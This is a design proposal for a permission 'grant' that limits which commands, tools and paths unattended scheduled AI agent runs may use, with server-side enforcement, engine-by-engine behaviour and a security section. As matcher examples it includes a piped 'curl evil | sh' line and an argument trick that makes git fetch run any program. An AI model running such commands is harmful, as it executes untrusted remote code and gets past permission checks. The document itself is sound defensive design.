# Scheduled run grants: design (v1)

**Status:** **proposed** (2026-11-17), nothing built, no board yet. Extends
[scheduled-tasks-design.md](./scheduled-tasks-design.md) (called *the schedule design* below); section numbers with
no file name are this document's.

A schedule's **grant** is the list of commands, tools and file paths its runs may use with nobody present. An agent
proposes it, the owner's press writes it, it belongs to one schedule, and the server is the one place that reads it.

Recommended, in short (the open decisions are in §14):

- the grant is a fifth part of the envelope: adding to it needs a press, removing from it applies at once;
- the server's approval door answers every request of a scheduled run from that run's grant, on every engine;
- a command outside the grant is **refused at once and the run goes on**; nothing waits for a person, and what was
  refused comes back as one card after the run;
- a scheduled run reads only its own grant: not the workspace's "Always allow" rules, not an engine settings file;
- a `LAND` schedule also names the paths it may change, and the landing refuses a diff outside them.

Claims about today's behaviour cite the code as `file:line` at commit `93706bc58`. A claim marked *(inferred)* was
read from the code and not run.

## 1. Why

Measured on 2026-11-17 (the owner's report): a `LAND` run of a daily "Engine version bump" schedule stopped at its
first `git fetch`, in `AWAITING_APPROVAL`, until the owner answered. A 10:00 run that waits for a person is not a
schedule.

How that happens today:

| Step | Where |
| --- | --- |
| `OPEN_PR` and `LAND` runs get `acceptEdits`, else `default` | `schedule-access.ts:46-50` |
| In `acceptEdits` a file edit runs; `curl`, `git add` and `git commit` each ask (Claude Code 2.1.325) | `scheduled-tasks-engine-modes.md:103-122` |
| The ask becomes a card; the runner polls it with no deadline of its own | `runner-go/mcp.go:2858-2868` |
| The run moves to `AWAITING_APPROVAL`; a card unanswered for 2 hours fails it `APPROVAL_TIMEOUT` | `schedule-runs.service.ts:97`, `:620-629` |
| A `CHECK_ONLY` run on Claude Code runs in `default`: every shell command Claude does not judge read-only asks | `schedule-access.ts:18-22`, `:58` |

The only way out today is **Always allow** on the card. What it writes differs by level:

| Level | Always allow writes | Read by |
| --- | --- | --- |
| `OPEN_PR`, `LAND` | the client's prefix rules (`git fetch:*`) as ordinary workspace rules (`sessions.service.ts:9931-9937`, `:10016-10019`; `ScheduleWaitingCard.tsx:156-173`) | every Claude Code and Antigravity session of the workspace as an engine allow rule (`permission-rules.ts:110-127`), and every Codex, Kimi, Antigravity and Cursor card at the server (`:149-154`, `:254-262`) |
| `CHECK_ONLY` | the card's exact command, marked `fromScheduleRun` (`schedule-access.ts:266-271`, `sessions.service.ts:10041-10056`) | only scheduled checks of that workspace, by literal comparison at the approval door (`schedule-access.ts:288-293`, `runner-api.controller.ts:6498`) |

### 1.1 Failure modes

1. **The first runs do nothing.** Each new command is one stalled run and one press. A run with eight distinct
   commands needs up to eight attended days.
2. **The rule is too broad.** An `OPEN_PR` or `LAND` card's rule is the workspace's: `git fetch:*` allowed for a
   schedule is allowed for every interactive session there, and for every other schedule.
3. **The rule is too broad the other way.** An editing run starts with every workspace rule a person's interactive
   sessions wrote (`schedule-access.ts:256` returns the claim's list unchanged for a run that is not a Claude
   check). A `Bash(python:*)` clicked once in a conversation runs unasked in every unattended editing run.
4. **Claude Code's settings files apply.** Only a `CHECK_ONLY` run is started with `--setting-sources ''`
   (`claude_spawn.go:130-133`). An editing run loads `permissions.allow` from the checkout's
   `.claude/settings.local.json` and the user's `settings.json`, which the record measured running commands unasked
   (`scheduled-tasks-engine-modes.md` §10.1).
5. **Nobody can read what a schedule may run.** The answer is the union of workspace rules, settings files and the
   engine's own read-only judgement, on no surface of the schedule.
6. **A stall holds everything behind it.** At most one run is in progress per schedule (schedule design §3), so a
   run waiting 2 hours on a card queues the next slot, and holds a runner slot meanwhile.
7. **On Codex, clicking never helps** *(inferred)*. Codex's command reaches the card as `/bin/bash -lc '…'`
   (`scheduled-tasks-engine-modes.md:613-614`). `bashCommandRules` derives no rule from a wrapper
   (`bashRules.ts:316`) and a wrapper prefix is not storable (`permission-rules.ts:55-58`), so no workspace rule
   covers the next run's command.
8. **The level's denied commands are not denied on every engine** *(inferred)*. `OPEN_PR_DISALLOWED_TOOLS`
   (`schedule-access.ts:321-336`) reaches Claude Code as `--disallowedTools`. Kimi's matcher never matches a
   `Bash(…)` rule with content (`kimi_acp.go:2322-2324`) and Codex's bridge reads no deny list
   (`codex_appserver.go:1157-1200`), so there `gh pr merge` is a card, and a workspace rule `gh pr:*` answers that
   card ALLOW at the server (`permission-rules.ts:275-283` consults no deny list).

## 2. What does not change

- The three access levels, their order, their modes and their denied lists (schedule design §6.2). A grant never
  lifts a level's *May not* column: a denied command stays denied whatever the grant says (§6.2).
- The envelope rule (schedule design §4): inside applies at once with Undo; outside waits for one press; nothing but
  an owner-channel press writes the envelope.
- "Said, not configured" (schedule design §2). The grant has no form. An agent proposes entries; the page shows them
  and removes them.
- Ordinary sessions. Their cards, their **Always allow** and the workspace rules behave as today.
- A run's mode is never an allow-everything mode (`schedule-access.ts:64-66`).
- The landing path: `LAND` still lands through the ordinary merge and its merge check
  (`schedule-runs.service.ts:654-711`).

## 3. Three designs

| | A. A grant per schedule, read at the server's door | B. An engine sandbox, everything inside it allowed | C. Schedule-scoped "Always allow" |
| --- | --- | --- | --- |
| What is pre-approved | named commands, tools and paths | whatever the sandbox permits: writes inside the worktree, network on or off | whatever the owner has clicked so far |
| Who wrote it | the agent proposes, the owner presses once | Orbit, per engine | the owner, one card at a time |
| First run | unattended when the proposal was right; otherwise finishes what it can and returns one card | unattended | stalls at each new command |
| Outside it | refused, the run goes on | refused by the OS | asks and waits 2 hours |
| The owner reads it as | a list on the card and the page | "edits its worktree, no network" | a list that grows by itself |
| Engines | every engine that can ask (§7) | Codex and DeepSeek Harness have one today; Claude Code's and Cursor's are unmeasured; Kimi, OpenCode and Antigravity have none | as today |
| Weakness | a prefix does not bound arguments; a command that runs repository code is as wide as the repository (§10) | the measured case needs the network (`git fetch`, `npm view`, `curl`) and a commit writes outside the worktree (the shared `.git`, `codex_auto_policy.go:30-36`); "network on" is all or nothing | keeps failure modes 1, 5 and 6 |

A fourth, rejected without a column: run editing schedules in the engine's Auto mode. `derivePermissionSemantics`
reports `unapproved: 'allow'` for it on every engine, and on Kimi, OpenCode and Antigravity "nothing is reviewed"
(`permissionSemantics.ts:73-90`). The card's promise would rest on a classifier that three engines do not have.

**Recommended: A, with B added later as a second wall on the engines that have a sandbox (§13, P4).** A is the only
one that answers "what exactly is pre-approved" in words the owner can read before pressing, and the only one that
works the same way on six engines. B is the stronger boundary where it exists, and it does not conflict with A: the
grant says what is expected, the sandbox bounds what an expected command can reach.

C is what the owner does by hand today. It is kept only as the attended path of §6.4.

## 4. Model

```text
ScheduleGrantEntry                          the envelope's fifth part; written only by a press
  id, scheduleId
  kind        COMMAND | TOOL | PATH
  match       EXACT | PREFIX                COMMAND only
  value       "git fetch" | "python3 -m unittest discover -s tests" | "WebFetch" | "src/runner-go/engines/**"
  state       ALLOWED | DECLINED | REMOVED
  proposedBy  SESSION | RUN | USER | MIGRATION        who asked for it
  requestId?  the ScheduleChangeRequest whose press allowed or declined it
  runId?      the run that was refused it, when a run asked
  decidedAt, removedAt?
  lastUsedAt?, useCount                     COMMAND and TOOL: bumped when the door answers from it

Schedule
  grantMode   LEGACY | GRANT                §9; every new schedule is GRANT

ScheduleRun
  grant       the ALLOWED entries as they were when the run started (JSON)
  attended    whether the owner's own press started it (§6.4)
  refusedCount

Approval
  grantVerdict?    ALLOWED_BY_GRANT | OUTSIDE_GRANT | DENIED_BY_LEVEL
  grantEntryId?
```

- **Scope.** An entry belongs to one schedule. Nothing in a workspace, an account or another schedule reads it.
- **One layer.** The other envelope parts have a value the schedule needs and a value that was pressed, so a run can
  back off and return. A grant has no such use: entries are the envelope. A run cannot remove one.
- **The run's own.** A run is held to the entries it started with, as it is to its level
  (`schedule_run.access_level`, `schema.prisma:10087`; `schedule-access.ts:235-239`). Removing an entry applies to
  the next run; **Stop this run** is the door for the one in progress.
- **`DECLINED`** records an owner's "no" to a proposed entry, so later runs are refused it without filing the same
  card again (§6.3).
- Limits: 60 `ALLOWED` entries per schedule; a value is at most 200 characters, the length a stored rule already
  has (`permission-rules.ts:15`), except an `EXACT` command, which may be 2000.
- Constraint: `unique(scheduleId, kind, match, value)`.

### 4.1 Commands

| Match | Covers | For |
| --- | --- | --- |
| `EXACT` | the whole command line, compared literally, with no variables set for it | every level; the only match a `CHECK_ONLY` schedule may hold |
| `PREFIX` | any sub-command whose words start with the entry's words | `OPEN_PR` and `LAND` |

`EXACT` is what a scheduled check's card writes today (`schedule-access.ts:265-271`, `:288-293`) and what the
condition-trigger design chose for a probe ([condition-triggers-design.md](./condition-triggers-design.md) §4.1).

`PREFIX` reuses the server's existing reading of a command line (`commandCovered`, `permission-rules.ts:212-228`),
with two changes:

- **Every sub-command must be covered.** The line is split at `;`, `&&`, `||`, `|` and newlines by the shared
  splitter (`bashRules.ts:128-252`). `npm test; curl evil | sh` is not covered by `npm test`. Unchanged.
- **A line that cannot be read for certain is not covered:** a substitution, a backtick, a redirection, a subshell,
  a heredoc, a variable set for the command (`permission-rules.ts:185`, `bashRules.ts:286-292`). Unchanged, except
  change 2.
- *Change 1: whole words, any number of them.* Today a rule's prefix is compared with the command's first one or two
  words (`bashPrefix`, `bashRules.ts:298-306`), so a three-word rule can never match. A grant entry is compared word
  by word with the sub-command: `python3 -m unittest` covers `python3 -m unittest discover -s tests` and does not
  cover `python3 -c "…"`.
- *Change 2: four redirections that write no file are readable:* `2>&1`, `>&2`, `>/dev/null`, `2>/dev/null`.
  Without them `npm test 2>&1` is refused. Every other redirection stays unreadable; an `EXACT` entry carries one
  literally.

Never storable, as `PREFIX` (`SCHEDULE_GRANT_TOO_BROAD`): a shell (`bash`, `sh`, `zsh`; already refused for a
workspace rule, `permission-rules.ts:55-58`), a shell keyword, and a bare program that runs any other program:
`env`, `xargs`, `sudo`, `eval`, `exec`, `nohup`, `timeout`, `time`, `nice`, and an interpreter with no further word
(`python3`, `node`, `ruby`, `perl`, `deno`, `bun`). `python3 -m unittest` is storable; `python3` is not.

Argument patterns (`git push * main`, a regular expression) are **not** offered. The level's own denied list uses
them (`schedule-access.ts:327-330`) because a deny that matches too much only refuses. An allow that matches too
much runs something, and nobody can read off a card what a glob in the middle of a command covers.

### 4.2 Tools

A `TOOL` entry is one tool name, exactly: `WebFetch`, `WebSearch`, `mcp__docs__search`. No wildcard, and no
`mcp__orbit__*` name: Orbit's own tools are governed by the level's lists, not by the grant. `Edit` and `Write` are
refused on a `CHECK_ONLY` schedule.

### 4.3 Paths

A `PATH` entry is a repository-relative glob (`src/runner-go/engines/**`, `docs/engine-versions.md`), read at
landing (§6.5). It is not read during the run: an engine edits freely in its own worktree, and what counts is what
reaches `main`.

- `LAND` only in v1. An `OPEN_PR` run's diff is reviewed by a person in the PR.
- `**` alone means every path, and the card says so in those words.
- **Paths that change what runs** are covered only by an entry that names them, never by a wider glob:
  `.github/**`, `.claude/**`, `.orbit/**`, `CLAUDE.md`, `AGENTS.md`, and a git submodule pointer. A schedule that
  bumps a CI action says so on its card.

## 5. Lifecycle

### 5.1 Creation

The creating agent already does the check once, as the baseline (schedule design §8.1, step 2). The commands it ran
there are its evidence for the grant it proposes:

```text
schedule_create({ …, accessLevel: 'LAND',
  grant: { commands: [{ match: 'PREFIX', value: 'git fetch' }, { match: 'PREFIX', value: 'npm view' },
                      { match: 'PREFIX', value: 'python3 -m unittest' }, { match: 'PREFIX', value: 'git commit' },
                      { match: 'EXACT',  value: 'curl -fsSL https://api.github.com/repos/openai/codex/releases/latest' }],
           tools: ['WebFetch'],
           paths: ['src/runner-go/engines/**', 'docs/engine-versions.md'] } })
```

The card gains two lines, between *May* and *Costs*:

```text
Create scheduled task?
Engine version bump
Every day at 10:00 Beijing time I check each engine's latest stable release and land a bump when there is one.

When      Daily 10:00 · Asia/Shanghai · first run tomorrow
Runs in   orbit · Claude Code
May       Edit and land on main · edits in its own worktree, then Orbit merges it into main after the run.
Runs      git fetch, git commit, npm view, WebFetch, and 1 exact command                       [Show all 5]
          Reaches the network: git fetch, npm view, WebFetch, curl …/releases/latest
          Runs code from the repository: python3 -m unittest
          Anything else is refused, not asked.
Changes   src/runner-go/engines/**, docs/engine-versions.md
Costs     Up to 7 runs a week, 30 min each
Today     Codex 0.169.0, same as pinned. Nothing to report.

You'll hear about new versions and failures only.                              [Not now]  [Create]
```

- **Who wrote it** is on the card by construction: the agent proposed every entry, and nothing is stored until the
  owner presses **Create**. Each entry records both (`proposedBy`, `requestId`).
- *Runs* with no entry reads "Only what the engine judges read-only. Anything else is refused, not asked."
- The two sub-lines are labels, not enforcement. The server derives them from the entry's first word against two
  short tables (`NETWORK`: `git fetch|pull|clone|push`, `curl`, `wget`, `npm`, `pnpm`, `yarn`, `pip`, `gh`, `go
  get|mod`, `docker pull`, `ssh`, `scp`, `WebFetch`, `WebSearch`; `RUNS_REPOSITORY_CODE`: `npm run|test`, `make`,
  `go test|run|generate`, `pytest`, `python3 …`, `node …`, `cargo`, `./…`). A program on neither is listed plainly.
- **Show all** opens the full list. A card with more than 60 entries is refused at the door, not truncated.
- A `LAND` create with no `paths` is refused (`SCHEDULE_GRANT_PATHS_REQUIRED`, §14 G4): the agent asks the person
  or proposes them.
- `schedule_create`'s description tells the agent: propose what the baseline ran; prefer `EXACT` for a command that
  reaches a fixed address; list the reading commands a pipe needs (`head`, `tail`, `grep`, `jq`), since every
  sub-command must be covered (§14 G7).

### 5.2 The first run

It starts unattended, like every run. The run block (schedule design §6.3) gains:

```text
  May run without asking: git fetch, git commit, npm view, python3 -m unittest, and 1 exact command (schedule_get lists them).
  Anything else is refused at once; nobody is asked. Do not look for another way to run a refused command: finish
  what you can and say in your report what you could not do.
  Declined by the owner, do not ask again: npm ci.
```

When the proposal was right, the run ends as any run does. When it was not, §6.3 applies: the run finishes what it
can, and the owner gets one card naming what was refused.

An owner who wants to be there for the first run presses **Run now** on the new schedule: that run is attended
(§6.4), asks live, and each answer can go into the grant.

### 5.3 Later runs

Unattended. Each answer the door gives from an entry bumps the entry's `useCount` and `lastUsedAt`, which the page
shows ("used 14 times, last on 16 Nov"). An entry not used for 30 days is marked "not used in 30 days". Nothing is
removed by itself: a grant that shrank silently would fail a run for a reason nobody chose.

### 5.4 Widening

Three routes, one card (the envelope card of schedule design §4, with the part `GRANT`):

| Route | Asked by | |
| --- | --- | --- |
| The server, after a run was refused something | `RUN` | filed from the door's own record (§6.3); the run does not have to ask |
| A run calling `schedule_update({grant: {add}})` | `RUN` | as schedule design §8.3: the card waits in Waiting on you and the run finishes under the grant it has |
| Any session ("let it also run `make lint`") | `SESSION` | the same card, in that session |

```text
Engine version bump wants to run more
Run 12 (17 Nov, 10:00) was refused 2 commands and finished without them.

Now       git fetch, git commit, npm view, python3 -m unittest, and 1 exact command
Asked     npm ci                 as refused: npm ci --ignore-scripts
          go vet                 as refused: go vet ./...
          Reaches the network: npm ci

                                   [Decline]  [Allow for later runs]  [Allow and run again]
```

- The card proposes a `PREFIX` entry when the shared derivation gives a clean one (`bashCommandRules`,
  `bashRules.ts:311-327`), else the `EXACT` command; always `EXACT` on a `CHECK_ONLY` schedule. The owner can ask
  for something narrower in a session.
- **Allow and run again** allows, then writes a `MANUAL` run under the usual overlap and budget rules.
- **Decline** records each asked entry `DECLINED`.
- Pending requests accumulate. Today a newer `UPDATE` request supersedes the older one (schedule design §3); a
  `GRANT` request instead takes the union with the pending one, so three runs refused three commands are one card.
- An entry already covered by an `ALLOWED` one is not a widening and is dropped from the request.

### 5.5 Narrowing and revoking

- **Remove** on an entry (page, or said in a session): applies at once, writes a `ScheduleRevision`, has **Undo**.
  As with any person's narrowing, going back needs a card, except through the owner's own Undo (schedule design §4).
- Narrowing the access level to `CHECK_ONLY` sets every `PREFIX` command, every `PATH` and the `Edit`-family tools
  `REMOVED`. Widening back proposes them again on the level's card.
- Moving the schedule to another workspace is already a widening; its card also re-states the whole grant, since the
  same command means something else in another repository.
- Deleting or ending a schedule keeps its entries with the schedule's history; nothing else read them.

## 6. Server enforcement

### 6.1 The claim

`scheduleRunAllowedTools` (`schedule-access.ts:249-260`) returns, for **every** run of a `GRANT` schedule, the
tools Orbit always allows (`ALWAYS_ALLOWED_TOOLS`, `permission-mode.ts:36`) and the level's own list, with no
workspace rule. A `CHECK_ONLY` run on Claude Code keeps `CHECK_ONLY_CLAUDE_ALLOWED_TOOLS`. The grant is **not**
exported as engine allow rules (§14 G6): a check's commands already are not, "never parsed as Claude permission
patterns" (`schedule-access.ts:257-258`).

The claim adds `agent.scheduledRun: { attended }`, beside `scheduledCheckOnly` (`schedule-access.ts:361-363`), for
the runner changes of §7.

### 6.2 The approval door

`POST /runner/sessions/:id/approvals` (`runner-api.controller.ts:6251-6258`) for a session serving a run of a
`GRANT` schedule, in this order:

1. A `CHECK_ONLY` run on Claude Code asking about anything but a shell command: DENY, as today
   (`checkOnlyRefusesApproval`, `schedule-access.ts:306-314`).
2. **The level's denied commands.** A shell command matching a `Bash(…)` entry of the level's denied list is DENY
   (`DENIED_BY_LEVEL`), on every engine. This closes failure mode 8: the list is read here, not only by Claude Code.
3. A question to a person (`AskUserQuestion`, `ExitPlanMode`, a SubAgent's question): DENY in an unattended run.
4. **The grant.** A shell command every sub-command of which an `ALLOWED` entry of the run's snapshot covers, or a
   tool a `TOOL` entry names: ALLOW (`ALLOWED_BY_GRANT`), recorded as a decided approval with no decider, as a
   standing grant is today (`AUTO_ALLOWED_MESSAGE`, `permission-rules.ts:164-165`), naming the entry.
5. A command a runner-hosted job asks about (`backgroundJobId`): judged by 2 and 4 like any other.
6. Otherwise, **outside the grant**: §6.3 when unattended, §6.4 when attended.

The workspace's rules are not read at any step (`standingGrantCovers`, `runner-api.controller.ts:6470-6501`, is not
called for such a session).

For Codex the door reads the command inside the wrapper: the runner sends Codex's own `commandActions` (its parse of
the script, `scheduled-tasks-engine-modes.md:613-614`) with the card, and each action's command is one sub-command.
A request with no `commandActions` is outside the grant.

### 6.3 Outside the grant, unattended

The door answers **DENY at once** (`OUTSIDE_GRANT`). No card, no push, no `AWAITING_APPROVAL`. The engine reads:

```text
Not run: `tail` is not in this scheduled run's grant (`npm test` is). Nobody is asked during a scheduled run.
Do not try another way to run it. Finish what you can and say in your report what you could not do.
```

- The run goes on, and ends by its report like any run.
- **A cap.** At the 5th refusal in one run, or the 2nd refusal of the same command, the run is interrupted and fails
  `OUTSIDE_GRANT` (a new `failureReason`, not retried: the work started). An agent that keeps trying is spending the
  budget on nothing.
- **After the run**, when anything was refused, the server files one `GRANT` request from the door's records (§5.4)
  and one `SCHEDULE_WIDEN` item, and pushes once. A refusal of a `DECLINED` entry, or of an entry already on a
  pending request, files and pushes nothing.
- **A `LAND` run that was refused anything lands nothing** (§14 G3): the run fails `OUTSIDE_GRANT`, its branch is
  kept, and the card's **Allow and run again** is the way forward. A run that could not run its tests should not
  reach `main` unattended.
- `APPROVAL_TIMEOUT` stays for attended and `LEGACY` runs only.

Why not ask and wait: nobody is there, which is the premise. A wait holds the runner slot and queues the next slot
(failure mode 6), and a daily push that needs an answer within 2 hours teaches the owner to ignore pushes.
Why not fail at the first refusal: most refusals are incidental (a `| tail -5`), and a run that reports "bumped,
could not run `go vet`" is worth more than a failed run.

### 6.4 Attended runs

A run is **attended** when the owner's own press started it: **Run now** from a client, or **Allow and run again**
on a card (the owner-interactive channel, as schedule design §8.4 already distinguishes). A session's or a token's
Run now is unattended.

In an attended run, step 6 of §6.2 is a card, as today, with a 2-hour timeout. Its buttons are **Deny**, **Allow
once** and **Allow for this schedule**; the last one writes a grant entry (the press is the owner's, so it is an
envelope press) and never a workspace rule. This is design C, kept where a person is present: one sitting with the
first run settles the grant.

### 6.5 Landing

Before a `LAND` run's branch is merged (`landRun`, `schedule-runs.service.ts:654-711`), the changed paths are held
to the run's `PATH` entries:

- The merge job carries `allowedPaths`. The runner, which already performs the merge (`mergeToMain`,
  `runner-go/worktree.go:1645`), lists `git diff --name-only --no-renames <merge-base>..<branch>` and refuses the
  merge before touching `main` when a path matches no entry, or matches a path of §4.3 that no entry names. With
  `--no-renames` a rename is checked at both its old and its new path.
- A refusal is `LANDING_FAILED` with the reason "3 files outside what this schedule may change: …" (the first 10
  paths), through the existing push and Waiting on you path (schedule design §7.3). Nothing is landed; the branch is
  kept. The item offers **Allow these paths and land** (a `GRANT` press, then the landing is retried on the same
  commit), **Open the run** and **Dismiss**.
- The check is on the runner because the commit is there. The server does not trust a path list an engine reported.
- A runner that does not advertise `schedule-land-paths/v1` is not handed a `LAND` landing of a schedule with
  `PATH` entries: the run fails `LANDING_FAILED` ("update the runner"), never lands unchecked.
- The merge check runs after the path check, unchanged.

### 6.6 Start checks

Added to schedule design §6.1, each a `heldReason`:

- `GRANT_NOT_ENFORCEABLE`: the engine the run would use cannot be held to a grant (§7: OpenCode for editing levels,
  as today under `ACCESS_NOT_ENFORCEABLE`).
- `LAND_PATHS_MISSING`: a `LAND` schedule in `GRANT` mode with no `PATH` entry (only reachable by removing the last
  one).

## 7. Runner and engines

The door is the server's, so most of this works on any runner. Three runner changes, behind one capability
`scheduled-run-grant/v1`:

1. **Claude Code: no settings file.** A run with `agent.scheduledRun` is started with `--setting-sources ''`, and
   keeps the user's `env` and credential helpers through the runner's own `--settings` file, exactly as a scheduled
   check is (`schedule_check_only.go:85-114`, `claude_spawn.go:122-133`). Closes failure mode 4.
2. **Codex: `commandActions` on the card** (§6.2).
3. **Landing paths** (§6.5), under its own capability.

A run claimed by a runner without the capability still has its requests answered from the grant; what it lacks is
change 1 (settings-file rules still run unasked there, as they do today) and change 2 (every Codex command is
outside the grant). Neither is wider than today.

What the grant can govern is what the engine asks about. Per engine, for an editing run:

| Engine | Mode | Reaches the door | Runs without reaching it | Grant |
| --- | --- | --- | --- | --- |
| Claude Code | `acceptEdits` | every shell command Claude does not judge read-only, compound lines as a whole; other tools without an allow rule (measured, `scheduled-tasks-engine-modes.md:117-122`) | edits in the worktree; `git log`, `ls`, `cat`, `grep`; Orbit's tools and the Orbit CLI's allow rules (`agent_instructions.go:470-477`) | enforced |
| Codex | `acceptEdits` → `untrusted`, full disk access (`codex_appserver.go:1072-1074`, `codex_auto_policy.go:58`) | every command Codex does not consider safe and read-only | file changes, which the runner accepts itself (`codex_appserver.go:1136-1139`) | enforced once `commandActions` is sent; unmeasured |
| Kimi | `acceptEdits` (Kimi `default`) | tools Kimi does not deem safe (`permissionSemantics.ts:12-14`) | `Edit` and `Write` (`kimi_acp.go:2298`); tools it deems safe | enforced for what asks; shell in this mode not measured (`scheduled-tasks-engine-modes.md:230-233`) |
| Cursor CLI | `acceptEdits` | a command off Cursor's own allowlist, an MCP tool, a web fetch | writes inside the workspace, in every mode; the few commands Cursor allows itself, such as `ls` (`permissionSemantics.ts:321-331`) | enforced for what asks; not measured |
| Antigravity | `acceptEdits`, behind Orbit's approval hook | every call that acts (`permissionSemantics.ts:17-26`) | reads of the workspace (`antigravity_approval.go:193-199`) | enforced; not measured (no signed-in host) |
| DeepSeek Harness | `default` | a file-sandbox escalation; a command its tool gate names (a push, an HTTP write, …) | reads, web tools, Orbit's tools, and **commands that write no files, network ones included** (`permissionSemantics.ts:235-241`) | partial: the grant cannot hold a network command there, and the card says so. Its cards are not matched at the server today (`permission-rules.ts:149-154`); the door's step 4 adds it |
| OpenCode | none | nothing: it cannot ask, and rejects every command in `acceptEdits` (`scheduled-tasks-engine-modes.md:297-311`) | | `OPEN_PR` and `LAND` stay refused (`SCHEDULE_ACCESS_NOT_ENFORCEABLE`). A later change could write the grant into OpenCode's own permission map; that is OpenCode's matcher, not this one, and is not proposed here |

On an engine marked partial the create card adds one line under *Runs*, from `permissionSemantics.ts`' own note:
"On DeepSeek Harness, commands that write no files run without being checked against this list."

`CHECK_ONLY` keeps its per-engine modes (schedule design §6.2). The grant changes two things there: a scheduled
check's exact commands move from workspace rows to the schedule's entries (§9), and on Claude Code a command outside
them is refused instead of asked. Codex's check stays in its read-only sandbox and never reaches the door; Kimi's
check asks per command and is now answered from the grant.

## 8. Clients

Boards first (`docs/mocks/scheduled-run-grants/`), iOS as the reference, as for schedule design §9.2. Copy lives in
`SCHEDULE_COPY` (`src/shared/src/schedule.ts`) and its two ports (`ScheduleCopy.swift`, `ScheduleCopy.kt`).

| Surface | Change | Web | macOS and iOS | Android |
| --- | --- | --- | --- | --- |
| Create card | *Runs* and *Changes* lines, **Show all** | `ScheduleCards.tsx` | `ScheduleCards.swift` | `ScheduleCards.kt` |
| Widen card | part `GRANT`: *Now*, *Asked* with the refused command, three buttons | `ScheduleCards.tsx`, `ScheduleWaitingCard.tsx` | `ScheduleCards.swift` | `ScheduleCards.kt` |
| Inspector | a **May run** section (below) | `ScheduledPage.tsx` | `ScheduledPage.swift` | `ScheduledPage.kt` |
| Run row | "Refused 2 commands" under the summary, opening the list | `ScheduledPage.tsx` | `ScheduledPage.swift` | `ScheduledPage.kt` |
| Attended run's card | **Allow for this schedule** in place of **Always allow** | `ScheduleWaitingCard.tsx:153-190` | the approval card | the approval card |
| Landing refusal | the paths, **Allow these paths and land** | Waiting on you | Waiting on you | Waiting on you |

iOS draws these from OrbitKit, as the macOS files above do *(inferred from the file layout; `src/ios` holds no
schedule view of its own)*.

The inspector's section:

```text
May run                                                     Check only · Open a PR · ▸ Edit and land on main
  git fetch                    used 14 times · last 16 Nov                                        Remove
  npm view                     used 14 times · last 16 Nov                                        Remove
  python3 -m unittest          used 3 times · last 12 Nov · runs code from the repository         Remove
  curl -fsSL https://api.git…  exact · used 14 times                                              Remove
  WebFetch                     tool · not used in 30 days                                         Remove
May change
  src/runner-go/engines/**                                                                        Remove
  docs/engine-versions.md                                                                         Remove
Declined
  npm ci                       17 Nov                                                              Forget
Anything else is refused, not asked.                                                            Change…
```

- **Remove** and **Forget** are controls, like Pause: they narrow, so they apply at once and show in the history
  with **Undo**. There is no add field: **Change…** opens a session with the schedule attached, as it does today
  (schedule design §8.2).
- Each entry's detail names who proposed it and which press allowed it ("proposed by run 12, allowed by you on 17
  Nov").
- Agents read the same record: `schedule_get` returns the entries with their use, and each run's refused commands.

## 9. Existing schedules

A schedule created before this ships is `grantMode = LEGACY` and runs exactly as today: workspace rules, cards, the
2-hour wait. Converting it silently would either refuse commands it runs today, or copy workspace-wide rules into
it that nobody chose for it.

- **One card per legacy `OPEN_PR` or `LAND` schedule**, in Waiting on you: "Let Engine version bump run without
  you?" It proposes a grant from what the owner already answered on that schedule's own cards: every approval of
  its runs' sessions answered ALLOW, with the rules remembered on it (`approval.rememberRule`,
  `sessions.service.ts:9968-9975`), as `PREFIX` entries, and the commands allowed once as `EXACT` entries. A `LAND`
  schedule's card also proposes paths: the paths its landed runs changed. **Allow** sets `GRANT`; **Not now** keeps
  `LEGACY`.
- The workspace rules those cards wrote stay where they are. They are the workspace's now, and the card says where
  to remove them (Workspace settings, `DELETE /workspaces/:id/permission-rules/:ruleId`,
  `workspaces.controller.ts:133`).
- **`CHECK_ONLY` schedules convert in the migration**, with no card, because nothing widens: each
  `workspace_permission_rule` row marked `from_schedule_run` becomes an `EXACT` entry on the schedule whose run's
  card wrote it (`approval_id` → session → run), or, where that session is gone, on every `CHECK_ONLY` schedule of
  the workspace, which is who reads the row today. The rows are then deleted.
- `schedule_update` on a `LEGACY` schedule that touches the access level or the grant goes through the conversion
  card first.
- `LEGACY` has an end: P3 removes it once no schedule is left in it, or the owner rules a date.

## 10. Security

**What a grant is.** In an editing run, a command grant states what is expected and records what ran. It is not a
sandbox, for two reasons that no matcher fixes:

- A prefix does not bound arguments. `git fetch` covers `git fetch --upload-pack=<program>`.
- The run can edit the repository, so an entry that runs repository code (`npm test`, `make`, `python3 -m
  unittest`) runs whatever the run wrote. The card labels those entries for that reason.

So the level's promise is kept by walls that do not depend on reading a command:

| Promise | Kept by |
| --- | --- |
| "edits nothing" (`CHECK_ONLY`) | `EXACT` commands only, the level's denied tools, Codex's read-only sandbox |
| "can't merge, release or deploy" | the denied Orbit tools; the denied commands, now read at the door on every engine (§6.2); the credentials the runner holds, which are the real bound |
| what reaches `main` (`LAND`) | the path allowlist (§6.5) and the merge check, both after the run and outside its reach |

**Network.** A granted command reaches whatever the runner host reaches, an intranet included. An engine's fetch
tool does too, and is already allowed to a check (`schedule-access.ts:110-111`). The card names the entries that
reach the network; a `PREFIX` entry on such a program is "any address". The agent is told to propose `EXACT` for a
fixed address. V1 goes no further (§14 G9).

**Secrets.** A shell command runs as the runner's user. It can read what that user can: the workspace's environment
variables, which the claim hands the engine (`queue.service.ts:849`), a configured provider's key (`:1309`), SSH and
cloud credentials on the host, other workspaces' checkouts. With a network entry, that is a path out. This is true
of every session with a shell today; what changes is that nobody is watching. Three measures:

- a scheduled run reads web content (release notes), which may carry instructions. The grant is what bounds what
  such instructions can run, which is the reason to keep it narrow and to refuse rather than ask;
- an `EXACT` entry is stored and shown in full on every client and in `schedule_get`: a create is refused
  (`SCHEDULE_GRANT_HOLDS_SECRET`) when an entry carries a literal credential (an `Authorization:` header value, a
  `token=` or `key=` argument, a URL with a password). `$GH_TOKEN` is readable syntax and is the way to name one;
- P4's sandbox, where the engine has one.

**Scope.** No workspace rule reaches a `GRANT` run, and no grant entry reaches anything else. An attended run's
**Allow for this schedule** cannot write a workspace rule. The grant is written only by an owner-channel press, as
every envelope part is (schedule design §4, §9.1): a session, a run and a personal access token can only ask.

**A run widening itself.** A run may ask, and the ask is a card. It cannot allow, cannot answer its own card, and a
`DECLINED` entry stops it asking again. A run that edits files to change what a granted command does (a `Makefile`
target, an npm script) is inside "runs code from the repository"; for `LAND` the changed file must also be inside
*Changes* to reach `main`.

**The matcher.** One implementation, on the server, shared with the splitter that derives rules
(`bashRules.ts:1-7` states why it is shared). It fails closed: unreadable is not covered. It ships with a fuzz spec
against a real `bash -n` reading of the same lines, as the regex ports are checked across engines.

## 11. Agents

